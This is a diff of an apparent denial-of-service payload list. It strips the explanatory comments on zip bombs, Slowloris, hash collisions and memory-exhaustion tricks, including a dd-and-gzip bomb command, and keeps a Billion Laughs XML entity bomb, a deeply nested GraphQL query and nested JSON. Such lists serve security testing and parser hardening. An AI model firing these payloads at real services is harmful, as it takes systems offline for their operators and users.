@@ -1,13 +1,3 @@
-# ============================================================
-# Denial of Service — Resource Exhaustion
-# ============================================================
-
-# ---- Large Payload ----
-# Send max-size body to exhaust memory/disk
-# Content-Length: 999999999 with slow body
-# Multipart with many small fields
-
-# ---- Billion Laughs (XML) ----
 <?xml version="1.0"?>
 <!DOCTYPE lolz [
   <!ENTITY lol "lol">
@@ -22,33 +12,6 @@
 ]>
 <lolz>&lol9;</lolz>
 
-# ---- GraphQL DoS ----
-# Deeply nested query
 {user{friends{friends{friends{friends{friends{id name email}}}}}}}
 
-# ---- Circular Reference (JSON recursive) ----
-# Some JSON parsers DoS on circular/deeply nested:
 {"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":"v"}}}}}}}}}}}}}}}
-
-# ---- Hash Collision DoS ----
-# PHP: send form with many keys that all hash to same bucket
-# Java HashMap: keys chosen so all go to same bucket
-# Degenerate query string: a[0]=1&a[1]=2&a[2]=3...&a[100000]=1
-
-# ---- Zip Bomb ----
-# Upload file that extracts to huge size
-# 42.zip: 42KB → 4.5PB when extracted
-# Create: dd if=/dev/zero bs=1M count=1000 | gzip > bomb.gz
-
-# ---- Slowloris-Style ----
-# Open many connections, send partial HTTP request headers slowly
-# Each connection kept open → exhausts server connection pool
-
-# ---- Application-Level Flood ----
-# Expensive operations: search, export, report generation
-# Trigger heavy DB queries: ?search=*&limit=999999&sort=complex_field
-
-# ---- Memory Exhaustion via Allocation ----
-# Send request that causes large memory allocation:
-# Image resize: upload 1x1 PNG with IHDR claiming width=99999999
-# Archive extraction without size limit
